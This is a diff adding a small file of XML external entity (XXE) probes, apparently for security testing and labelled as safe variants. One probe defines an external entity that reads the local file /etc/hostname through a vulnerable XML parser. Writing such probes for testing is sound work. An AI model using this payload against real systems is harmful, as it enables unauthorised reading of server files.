@@ -1,0 +1,10 @@
+# XXE probes (safe variants; do not exfiltrate)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe "test"> ]>
+<root>&xxe;</root>
+
+<?xml version="1.0"?>
+<!DOCTYPE data [ <!ENTITY test SYSTEM "file:///etc/hostname" > ]>
+<data>&test;</data>
+
+
